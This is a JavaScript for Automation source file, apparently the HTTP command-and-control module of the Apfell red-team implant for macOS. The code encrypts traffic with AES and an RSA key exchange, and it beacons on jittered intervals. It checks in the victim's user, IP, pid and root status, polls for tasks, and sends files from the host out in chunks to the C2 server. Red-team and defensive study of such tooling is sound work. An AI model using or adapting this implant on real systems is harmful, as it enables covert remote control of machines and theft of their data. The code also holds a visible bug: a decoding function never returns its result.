//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{

	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.c2_config = raw_c2_config;
		this.baseurls = this.c2_config['apfellBases'];
		this.get_file_path = this.c2_config['POST']['pullFile'];
        this.get_next_task = this.c2_config['GET']['getNextTask'];
        this.post_response = this.c2_config['POST']['postResponse'];
        this.interval = this.c2_config['interval'];
        this.jitter = this.c2_config['jitter'];
        this.aes_psk = "AESPSK"; // base64 encoded key

        this.headers = this.c2_config['Headers'];
        this.cookies = this.c2_config['Cookies'];
        this.chunk_size = this.c2_config['chunk_size'];

        if(this.aes_psk !== ""){
		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
		}

        if(this.c2_config['POST'].hasOwnProperty('postNewCallbackEKE')){
            this.using_key_exchange = true;
            this.exchanging_keys = true;
            this.post_new_callback = this.c2_config['POST']['postNewCallbackEKE'];
        }else if(this.c2_config['POST'].hasOwnProperty('postNewCallbackPSK')){
            this.using_key_exchange = false;
            this.exchanging_keys = false;
            this.post_new_callback = this.c2_config['POST']['postNewCallbackPSK'];
        }else if(this.c2_config['POST'].hasOwnProperty('postNewCallback')){
            this.post_new_callback = this.c2_config['POST']['postNewCallback'];
            this.using_key_exchange = false;
            this.exchanging_keys = false;
        }
	}
	base_url(){
	    return this.baseurls[Math.floor(Math.random() * this.baseurls.length)];
    }
	encrypt_message(data){
    // takes in the string we're about to send, encrypts it, and returns a new string
    //create the encrypt transform variable
    var encrypt = $.SecEncryptTransformCreate(this.cryptokey, Ref());
    $.SecTransformSetAttribute(encrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
    $.SecTransformSetAttribute(encrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
      //generate a random IV to use
    var IV = $.NSMutableData.dataWithLength(16);
    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
    //var IVref = $.CFDataCreate($(), IV, 16);
    $.SecTransformSetAttribute(encrypt, $.kSecIVKey, IV, Ref());
    // set our data to be encrypted
    var cfdata = $.CFDataCreate($.kCFAllocatorDefault, data, data.length);
    $.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, cfdata, Ref());
    var encryptedData = $.SecTransformExecute(encrypt, Ref());
    // now we need to prepend the IV to the encrypted data before we base64 encode and return it
    var final_message = IV;
    final_message.appendData(encryptedData);
    return final_message.base64EncodedStringWithOptions(0);
  }
  decrypt_message(data){
    //takes in a base64 encoded string to be decrypted and returned
    //console.log("called decrypt");
    var nsdata = $.NSData.alloc.initWithBase64Encoding(data);
    var decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
    $.SecTransformSetAttribute(decrypt, $.kSecPaddingKey, $.kSecPaddingPKCS7Key, Ref());
    $.SecTransformSetAttribute(decrypt, $.kSecEncryptionMode, $.kSecModeCBCKey, Ref());
    //console.log("making ranges");
    //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
    var iv_range = $.NSMakeRange(0, 16);
    var message_range = $.NSMakeRange(16, nsdata.length - 16);
    //console.log("carving out iv");
    var iv = nsdata.subdataWithRange(iv_range);
    //console.log("setting iv");
    $.SecTransformSetAttribute(decrypt, $.kSecIVKey, iv, Ref());
    //console.log("carving out rest of message");
    var message = nsdata.subdataWithRange(message_range);
    $.SecTransformSetAttribute(decrypt, $.kSecTransformInputAttributeName, message, Ref());
    //console.log("decrypting");
    var decryptedData = $.SecTransformExecute(decrypt, Ref());
    //console.log("making a string from the message");
    var decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
    //console.log(decrypted_message.js);
    return decrypted_message;
  }
  negotiate_key(){
    // Generate a public/private key pair
    let parameters = $({"type": $.kSecAttrKeyTypeRSA, "bsiz": $(4096), "perm": false});
    let privatekey = $.SecKeyCreateRandomKey(parameters, Ref());
    let publickey = $.SecKeyCopyPublicKey(privatekey);
    let exported_public = $.SecKeyCopyExternalRepresentation(publickey, Ref());
    exported_public = exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
    let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
    let initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
    //console.log("sending: " + initial_message);
    // Encrypt our initial message with sessionID and Public key with the initial AES key
    while(true){
      try{
        let req = this.create_message(this.post_new_callback, initial_message, apfell.uuid);
        let base64_pub_encrypted = this.make_request(req);
        //var base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
        //var base64_pub_encrypted = this.htmlPostData("api/v1.1/crypto/EKE/" + apfell.uuid, initial_message);
        let pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
        // Decrypt the response with our private key
        let decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
        decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
        //console.log("got back: " + decrypted_message.js);
        let json_response = JSON.parse(decrypted_message.js);
        // Adjust our global key information with the newly adjusted session key
        this.aes_psk = json_response['SESSIONKEY']; // base64 encoded key
        this.parameters = $({"type": $.kSecAttrKeyTypeAES});
        this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
        this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
        this.exchanging_keys = false;
        return session_key;
      }catch(error){
        //console.log("error in negotiate_key: " + error.toString());
        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
      }
    }
  }
  gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      let plus_min = Math.round(Math.random());
      if(plus_min === 1){
          return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }else{
          return this.interval - (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }
    }
  prepend(){
    return arguments[1] + arguments[0];
  }
  r_prepend(){
    return arguments[0].slice(String(arguments[1]).length);
  }
  append(){
    return arguments[0] + arguments[1];
  }
  r_append(){
    return arguments[0].slice(0, -1 * String(arguments[1]).length);
  }
  b64(){
    return base64_encode(String(arguments[0]));
  }
  r_b64(){
    return base64_decode(String(arguments[0]));
  }
  random_mixed(){
      let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*36)).toString(36)).join('');
      return arguments[0] + m;
  }
  r_random_mixed(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
  random_number(){
      let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*10)).toString(10)).join('');
      return arguments[0] + m;
  }
  r_random_number(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
  random_alpha(){
      let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      let m = Array(Number(arguments[1])).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
      return arguments[0] + m;
  }
  r_random_alpha(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
    choose_random(){
	    let choice = Math.floor(Math.random()* arguments[1].length);
	    if(choice === arguments[1].length){choice -= 1;}
	    return arguments[0] + arguments[1][choice];
    }
    get_value(value, transforms){
      let tmp = value;
      try {
          if (transforms.length > 0) {
              for (let i = transforms.length - 1; i >= 0; i--) {
                  switch (transforms[i]['function']) {
                      case "base64":
                          tmp = this.r_b64(tmp);
                          break;
                      case "prepend":
                          tmp = this.r_prepend(tmp, transforms[i]['parameters']);
                          break;
                      case "append":
                          tmp = this.r_append(tmp, transforms[i]['parameters']);
                          break;
                      case "random_mixed":
                          tmp = this.r_random_mixed(tmp, transforms[i]['parameters']);
                          break;
                      case "random_number":
                          tmp = this.r_random_number(tmp, transforms[i]['parameters']);
                          break;
                      case "random_alpha":
                          tmp = this.r_random_alpha(tmp, transforms[i]['parameters']);
                          break;
                  }
              }
          }
      }catch(error){
          return "";
      }
    }
    retrieve_message(response, method="POST"){
      let data = "";
      if(this.c2_config[method]['ServerCookies'].hasOwnProperty('data')){
          let cookie = ""; //get the headers here, pull out right cookie value, and pass it in
          data = this.get_value(this.c2_config[method]['ServerCookies']['data']['name'], this.c2_config[method]['ServerCookies']['data']['transforms']);
        }else{
          //console.log("about to get value out of data response");
          data = this.get_value(($.NSString.alloc.initWithDataEncoding(response, $.NSUTF8StringEncoding)).js, this.c2_config[method]['ServerBody']);
        }
      //console.log("in retrieve_message, returning: " + data);
      return data;
    }
    create_value(value, transforms){
      for(let i = 0; i < transforms.length; i++){
        switch(transforms[i]['function']){
          case "base64":
              value = this.b64(value);
              break;
          case "prepend":
              value = this.prepend(value, transforms[i]['parameters']);
              break;
          case "append":
              value = this.append(value, transforms[i]['parameters']);
              break;
          case "random_mixed":
              value = this.random_mixed(value, transforms[i]['parameters']);
              break;
          case "random_number":
              value = this.random_number(value, transforms[i]['parameters']);
              break;
          case "random_alpha":
              value = this.random_alpha(value, transforms[i]['parameters']);
              break;
            case "choose_random":
                value = this.choose_random(value, transforms[i]['parameters']);
        }
      }
      return value;
    }
    create_message(endpoint, data, agent_id=apfell.uuid, method="POST"){
        let base_uri = endpoint['url'];
        if("base_uri".includes("<agent:uuid>")){
            base_uri = base_uri.replace("<agent:uuid>", agent_id);
        }
        for(let i in endpoint['urlFunctions']){
            let value = endpoint['urlFunctions'][i]['value'];
            if(value === undefined){value = ""}
            value = this.create_value(value, endpoint['urlFunctions'][i]['transforms']);
            base_uri = base_uri.replace(endpoint['urlFunctions'][i]['name'], value);
        }
        let query_string = "?";
        for(let i in endpoint['QueryParameters']){
            let value = agent_id;
            if(i !== "agent"){
                value = endpoint['QueryParameters'][i]['value'];
                if(value === undefined){value = ""}
            }
            value = this.create_value(value, endpoint['QueryParameters'][i]['transforms']);
            query_string += encodeURI(endpoint['QueryParameters'][i]['name']) + "=" + encodeURI(value) + "&";
        }
        base_uri += query_string.slice(0, -1); //take off trailing & or ?
        let cookies = this.cookies;
        for(let i in endpoint['Cookies']){
            let value = agent_id;
            if(i !== "agent"){
                value = endpoint['Cookies'][i]['value'];
            }
            value = this.create_value(value, endpoint['Cookies'][i]['transforms']);
            cookies[endpoint['Cookies'][i]['name']] = value;
        }
        let headers = this.headers;
        let cookie_header = "";
        for(let i in cookies){
            cookie_header += i + "=" + cookies[i] + ";";
        }
        if(cookie_header !== ""){
            headers['Cookie'] = cookie_header;
        }
        headers = Object.assign({}, headers, this.c2_config[method]['Headers']);
        let url = this.base_url() + base_uri;

        // now make the request object
        let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
        if(method === "POST") {
            if(this.aes_psk !== ""){
                data = this.encrypt_message(data).js;
            }
            data = this.create_value(data, endpoint['Body']);
            if(typeof data === "string"){
                data = $(data);
            }
            req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
            let postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
            let postLength = $.NSString.stringWithFormat("%d", postData.length);
            req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
            req.setHTTPBody(postData);
        }
        for(let i in headers) {
            req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(headers[i]), $.NSString.alloc.initWithUTF8String(i));
        }
        return req;
    }
  getConfig(){
    //A RESTful base config consists of the following:
    //  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
    let config = {
      "C2": {
          "commands": this.commands.join(","),
          "api_version": this.api_version,
          "aes_psk": this.aes_psk,
          "config": this.c2_config
      },
      "Host": {
          "user": apfell.user,
          "fullName": apfell.fullName,
          "ips": apfell.ip,
          "hosts": apfell.host,
          "environment": apfell.environment,
          "uptime": apfell.uptime,
          "args": apfell.args,
          "pid": apfell.pid,
          "apfell_id": apfell.id,
          "payload_id": apfell.uuid
      }};
    return JSON.stringify(config, null, 2);
  }
  setConfig(params){
    //A RESTful base config has 3 updatable components
    //  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
    if(params['commands'] !== undefined){
        this.commands = params['commands'];
    }
  }
  checkin(ip, pid, user, host, os, architecture){
    let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture};
    if(user === 'root'){info['integrity_level'] = 3;}
    let req = null;
    if(this.exchanging_keys){
        let sessionID = this.negotiate_key();
        req = this.create_message(this.post_new_callback, JSON.stringify(info), sessionID);
    }else{
        req = this.create_message(this.post_new_callback, JSON.stringify(info));
    }
    let jsondata = this.make_request(req);
    apfell.id = jsondata.id;

    // if we fail to get an ID number then exit the application
    if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }

    return jsondata;
  }
  getTasking(){
    // http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
    while(true){
        try{
            let req = this.create_message(this.get_next_task, null, apfell.id, "GET");
            let task = this.make_request(req, "GET");
            //let task = this.htmlGetData();
            return task;
        }
        catch(error){
            //console.log("error in getTasking: " + error.toString());
            $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
        }
    }
  }
  postResponse(task, data){
    //depending on the amount of data we're sending, we might need to chunk it
    let size = this.chunk_size;
    let offset = 0;
    let jsondata = null;
      //console.log("total response size: " + data.length);
    do{
      try{
        let csize = data.length - offset > size ? size : data.length - offset;
        let dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
        let encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
        offset += csize;
        let postData = {"response": encodedChunk};
        let req = this.create_message(this.post_response, JSON.stringify(postData), task.id);
        jsondata = this.make_request(req);
      }catch(error){
        //console.log("error in getTasking: " + error.toString());
        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
      }
    }while(offset < data.length);
    return jsondata;
  }
  make_request(req, method="POST", resp_format="JSON"){
    while(true){
      try{
          //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
        let response = Ref();
        let error = Ref();
        let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
        let message = this.retrieve_message(responseData, method);
        if(message === ""){continue;}
        //console.log("in make_request got back: " + message);
        if(!this.exchanging_keys){
            //we're not doing the initial key exchange
            if(this.aes_psk !== ""){
                //if we do need to decrypt the response though, do that
                //console.log("about to decrypt the response");
                let msg = this.decrypt_message(message).js;
                //console.log("decrypted message to: " + msg);
                if(resp_format === "JSON"){
                  return JSON.parse(msg);
                }else{
                  return msg;
                }
            }else{
                if(resp_format === "JSON"){
                  return JSON.parse(message);
                }else{
                  return message;
                }
            }
        }
        else{
            return message;
        }
      }
      catch(error){
          //console.log("error in make_request: "  + error.toString());
          $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
      }
    }
  }
  download(task, params){
    let output = "";
    if( does_file_exist(params)){
        let offset = 0;
        //let url = this.getPostResponsePath(task.id);
        let chunkSize = this.chunk_size; //3500;
        try{
            if(params[0] !== "/"){
                var fileManager = $.NSFileManager.defaultManager;
                var cwd = fileManager.currentDirectoryPath.js;
                params = cwd + "/" + params;
            }
            var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
            // Get the file size by seeking;
            var fileSize = handle.seekToEndOfFile;
        }catch(error){
            return JSON.stringify({'status': 'error', 'user_output': error.toString(), "completed": true})
        }
        // always round up to account for chunks that are < chunksize;
        let numOfChunks = Math.ceil(fileSize / chunkSize);
        let registerData = JSON.stringify({'total_chunks': numOfChunks, "full_path": params});
        registerData = convert_to_nsdata(registerData);
        let req = this.create_message(this.post_response, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}), task.id);
        let registerFile = this.make_request(req);
        //let registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
        //var registerFile = this.postResponse(task, registerData);
        if (registerFile['status'] === "success"){
            handle.seekToFileOffset(0);
            let currentChunk = 1;
            let data = handle.readDataOfLength(chunkSize);
            while(parseInt(data.length) > 0 && offset < fileSize){
                // send a chunk
                let fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'file_id': registerFile['file_id']});
                fileData = convert_to_nsdata(fileData);
                req = this.create_message(this.post_response, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}), task.id);
                let response = this.make_request(req);
                if(response['status'] === 'success'){
                  offset += parseInt(data.length);
                  handle.seekToFileOffset(offset);
                  currentChunk += 1;
                  data = handle.readDataOfLength(chunkSize);
                }else{
                  //console.log("error from apfell: " + response['error']);
                }
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
            output = JSON.stringify({"completed":true, "file_id": registerFile['file_id']})
        }
        else{
           output = JSON.stringify({'status': 'error', 'user_output': "Failed to register file to download", "completed": true});
        }
    }
    else{
        output = JSON.stringify({'status': 'error', 'user_output': "file does not exist", "completed": true});
    }
    return output;
  }
  upload(task, params){
    try{
      let data = JSON.stringify({"file_id": params});
      let req = this.create_message(this.get_file_path, data, apfell.id);
      data = this.make_request(req, "POST", "");
      let decoded_data = $.NSData.alloc.initWithBase64Encoding($(data));
      return decoded_data;
    }catch(error){
        return error.toString();
    }

  }
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
C2 = new customC2();
